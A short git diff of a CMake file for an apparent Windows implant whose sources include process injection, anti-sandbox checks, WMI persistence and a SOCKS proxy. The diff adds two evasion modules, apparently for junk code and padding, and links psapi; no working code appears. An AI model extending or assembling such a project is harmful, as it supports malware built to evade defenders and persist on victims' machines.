@@ -74,6 +74,8 @@ add_executable(main WIN32
     src/evasion/Injector.cpp
     src/evasion/AntiSandbox.cpp
     src/evasion/Detection.cpp
+    src/evasion/JunkLogic.cpp
+    src/evasion/Bloat.cpp
     src/execution/DotNetExecutor.cpp
     src/network/SocksProxy.cpp
     src/persistence/WmiPersistence.cpp
@@ -88,7 +90,7 @@ add_executable(main WIN32
 target_include_directories(main PUBLIC src external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops psapi
 )
 
 # Tests
